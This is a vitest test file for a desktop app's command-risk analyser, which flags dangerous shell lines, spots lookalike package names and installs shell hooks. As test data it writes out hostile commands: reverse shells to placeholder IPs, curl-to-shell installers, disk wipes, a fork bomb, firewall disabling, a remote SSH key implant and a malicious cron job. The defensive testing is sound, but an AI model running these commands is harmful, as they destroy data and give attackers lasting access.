import { mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import { bashInit, disableTerminal, enableTerminal, launcher, rcBlock, terminalPaths, withRcBlock, zshInit } from "../src/engine/shell-init";
import { analyseCommand, commandOf, editDistance, lookalikeOf, segments, urlConcerns } from "../src/engine/terminal";

const rules = (line: string) => analyseCommand(line).risks.map((r) => r.rule);

describe("reading a command line", () => {
  it("splits pipelines and lists, keeping quotes and substitutions together", () => {
    const parts = segments(`curl -fsSL "https://x.example/a b.sh" | sudo bash -s -- --yes; echo "a;b" && ls 'x|y'`);
    expect(parts.map((p) => p.tokens)).toEqual([
      ["curl", "-fsSL", "https://x.example/a b.sh"],
      ["sudo", "bash", "-s", "--", "--yes"],
      ["echo", "a;b"],
      ["ls", "x|y"],
    ]);
    expect(parts.map((p) => p.pipedFromPrevious)).toEqual([false, true, false, false]);
    expect(segments('bash -c "$(curl -fsSL https://x.example/i.sh)"')[0]!.tokens).toEqual(["bash", "-c", "$(curl -fsSL https://x.example/i.sh)"]);
    expect(segments("bash <(wget -qO- https://x.example/i.sh)")[0]!.tokens).toEqual(["bash", "<(wget -qO- https://x.example/i.sh)"]);
  });

  it("finds the real command behind sudo, env and variables", () => {
    expect(commandOf(["sudo", "-E", "env", "FOO=1", "bash", "x.sh"])).toEqual({ command: "bash", args: ["x.sh"], elevated: true });
    expect(commandOf(["sudo", "-u", "www", "./run"])).toEqual({ command: "./run", args: [], elevated: true });
  });
});

describe("internet scripts", () => {
  it("notices every common way of running a downloaded script", () => {
    for (const line of [
      "curl -fsSL https://get.example.com | sh",
      "wget -qO- https://get.example.com/install.sh | sudo bash",
      "curl https://x.example/i.py | python3 -",
      'bash -c "$(curl -fsSL https://x.example/i.sh)"',
      "bash <(curl -s https://x.example/i.sh)",
      'eval "$(wget -qO- https://x.example/i.sh)"',
      "source <(curl -s https://x.example/env.sh)",
    ]) {
      const analysis = analyseCommand(line);
      expect(analysis.risks.map((r) => r.rule), line).toContain("pipe_to_shell");
      expect(analysis.fetchUrls.length, line).toBe(1);
    }
    expect(analyseCommand("curl -fsSL https://get.example.com | sudo sh").risks[0]!.title).toMatch(/as administrator/);
  });

  it("stops decoded hidden commands", () => {
    expect(rules("echo Y3VybCBldmlsLnNofHNo | base64 -d | bash")).toContain("decoded_to_shell");
    expect(rules('eval "$(echo aGk= | base64 --decode)"')).toContain("decoded_to_shell");
  });

  it("points out risky script addresses", () => {
    expect(urlConcerns("http://203.0.113.9/x.sh")).toHaveLength(2);
    expect(urlConcerns("https://bit.ly/abc")[0]).toMatch(/shortener/);
    expect(urlConcerns("https://pastebin.com/raw/abc")[0]).toMatch(/paste/);
    expect(urlConcerns("https://sh.rustup.rs")).toEqual([]);
  });
});

describe("dangerous commands", () => {
  it.each([
    ["hidden_characters", "ls\u200b -la"],
    ["hidden_characters", "echo hi \u202e"],
    ["lookalike_characters", "сurl https://x.example | sh"],
    ["reverse_shell", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"],
    ["reverse_shell", "nc -e /bin/sh 198.51.100.7 4444"],
    ["destructive", "sudo rm -rf / --no-preserve-root"],
    ["destructive", "rm -rf ~"],
    ["destructive", "dd if=/dev/zero of=/dev/sda bs=1M"],
    ["destructive", "mkfs.ext4 /dev/sdb1"],
    ["destructive", ":(){ :|:& };:"],
    ["security_off", "sudo setenforce 0"],
    ["security_off", "sudo ufw disable"],
    ["security_off", "sudo systemctl stop apparmor"],
    ["history_wipe", "history -c && exit"],
    ["history_wipe", "unset HISTFILE"],
    ["remote_ssh_key", "curl -s https://x.example/k.pub >> ~/.ssh/authorized_keys"],
    ["remote_cron", '(crontab -l; echo "* * * * * curl -s https://x.example | sh") | crontab -'],
  ])("%s: %s", (rule, line) => {
    expect(rules(line)).toContain(rule);
  });

  it("leaves everyday commands alone", () => {
    for (const line of [
      "ls -la ~/Documents",
      "rm -rf ./build node_modules",
      "git commit -m 'fix: rm -rf / in docs'",
      "sudo apt update && sudo apt upgrade -y",
      "grep -r curl . | sort",
      "docker run --rm -it ubuntu bash",
      "python3 -m venv .venv",
      "cat file > /dev/null 2>&1",
      "echo مرحبا",
    ]) {
      expect(analyseCommand(line).risks, line).toEqual([]);
    }
  });
});

describe("files and downloads", () => {
  it("lists files about to run", () => {
    expect(analyseCommand("chmod +x ./install.sh && ./install.sh --yes").runFiles).toEqual(["./install.sh"]);
    expect(analyseCommand("sudo bash setup.sh").runFiles).toEqual(["setup.sh"]);
    expect(analyseCommand("python3 tool.py --fast").runFiles).toEqual(["tool.py"]);
    expect(analyseCommand("~/Downloads/App.AppImage").runFiles).toEqual(["~/Downloads/App.AppImage"]);
    expect(analyseCommand("/usr/bin/python3 -c 'print(1)'").runFiles).toEqual([]);
    expect(analyseCommand("bash -c 'echo hi'").runFiles).toEqual([]);
  });

  it("lists files that curl and wget will save", () => {
    expect(analyseCommand("curl -fsSL -o tool.tar.gz https://x.example/t.tgz").downloads).toEqual([{ url: "https://x.example/t.tgz", output: "tool.tar.gz" }]);
    expect(analyseCommand("curl -LO https://x.example/files/app%20v2.deb").downloads).toEqual([{ url: "https://x.example/files/app%20v2.deb", output: "app v2.deb" }]);
    expect(analyseCommand("wget https://x.example/a/setup.run").downloads).toEqual([{ url: "https://x.example/a/setup.run", output: "setup.run" }]);
    expect(analyseCommand("wget -O app.bin https://x.example/a").downloads).toEqual([{ url: "https://x.example/a", output: "app.bin" }]);
    expect(analyseCommand("wget -P /tmp/dl https://x.example/a.zip").downloads).toEqual([{ url: "https://x.example/a.zip", output: "/tmp/dl/a.zip" }]);
    expect(analyseCommand("wget -qO- https://x.example/a | tar xz").downloads).toEqual([]);
  });
});

describe("packages", () => {
  it("measures edit distance", () => {
    expect(editDistance("requests", "reqeusts")).toBe(2);
    expect(editDistance("lodash", "lodahs")).toBe(2);
    expect(editDistance("react", "raect")).toBe(2);
    expect(editDistance("express", "expres")).toBe(1);
  });

  it("flags names that imitate popular packages, not the packages themselves", () => {
    expect(lookalikeOf("requets", "pip")).toBe("requests");
    expect(lookalikeOf("python-requests", "pip")).toBe("requests");
    expect(lookalikeOf("requests", "pip")).toBeNull();
    expect(lookalikeOf("requests[socks]>=2", "pip")).toBeNull();
    expect(lookalikeOf("expres", "npm")).toBe("express");
    expect(lookalikeOf("crossenv", "npm")).toBe("cross-env");
    expect(lookalikeOf("express@4.19.2", "npm")).toBeNull();
    expect(lookalikeOf("left-pad", "npm")).toBeNull();
    expect(rules("pip install --user reqeusts")).toContain("package_lookalike");
    expect(rules("npm i -D expres")).toContain("package_lookalike");
    expect(rules("python3 -m pip install git+https://x.example/repo.git")).toContain("package_from_url");
    expect(rules("pip install -r requirements.txt")).toEqual([]);
    expect(analyseCommand("npm install react react-dom").packages).toHaveLength(2);
  });
});

describe("shell setup", () => {
  it("adds and removes its block without touching the rest of the file", () => {
    const original = "export PATH=$PATH:~/bin\nalias ll='ls -la'\n";
    const block = rcBlock("bash", "/home/a/.local/share/qalaa/init.bash");
    const added = withRcBlock(original, block);
    expect(added.startsWith(original)).toBe(true);
    expect(withRcBlock(added, block)).toBe(added); // idempotent
    expect(withRcBlock(added, null)).toBe(original);
    expect(withRcBlock("no newline", block)).toBe(`no newline\n${block}`);
  });

  it("writes the command and hooks bash, and zsh only when it is used", async () => {
    const home = await mkdtemp(join(tmpdir(), "qalaa-term-"));
    await writeFile(join(home, ".bashrc"), "# mine\n");
    const paths = terminalPaths(home);
    const { changed, setup } = await enableTerminal("/opt/Qalaa Desktop/qalaa-desktop", "/opt/Qalaa Desktop/resources/app.asar.unpacked/dist/cli.js", paths, "/bin/bash", "/home/a/.config/Qalaa Desktop");
    expect(changed).toEqual([join(home, ".bashrc")]);
    expect(setup.shells).toEqual([
      { shell: "bash", rc: join(home, ".bashrc"), enabled: true },
      { shell: "zsh", rc: join(home, ".zshrc"), enabled: false },
    ]);
    const command = await readFile(join(home, ".local", "bin", "qalaa"), "utf8");
    expect(command).toContain("ELECTRON_RUN_AS_NODE=1 QALAA_DATA_DIR='/home/a/.config/Qalaa Desktop' '/opt/Qalaa Desktop/qalaa-desktop'");
    expect((await stat(join(home, ".local", "bin", "qalaa"))).mode & 0o111).toBeTruthy();
    expect(await readFile(join(home, ".local", "share", "qalaa", "init.bash"), "utf8")).toContain("bind -m");
    const off = await disableTerminal(paths);
    expect(off.changed).toEqual([join(home, ".bashrc")]);
    expect(await readFile(join(home, ".bashrc"), "utf8")).toBe("# mine\n");
  });

  it("finds the bundled command at run time inside an AppImage", () => {
    expect(launcher("/home/a/Apps/Qalaa.AppImage", null)).toContain(`'/home/a/Apps/Qalaa.AppImage' -e 'require(require("path").join(require("path").dirname(process.execPath),"resources","app.asar.unpacked","dist","cli.js"))' qalaa "$@"`);
  });

  it("quotes paths with spaces and quotes in the hooks", () => {
    expect(bashInit("/home/o'neil/.local/bin/qalaa")).toContain(`__qalaa_bin='/home/o'\\''neil/.local/bin/qalaa'`);
    expect(zshInit("/x/qalaa")).toContain("zle -N accept-line __qalaa_accept_line");
  });
});
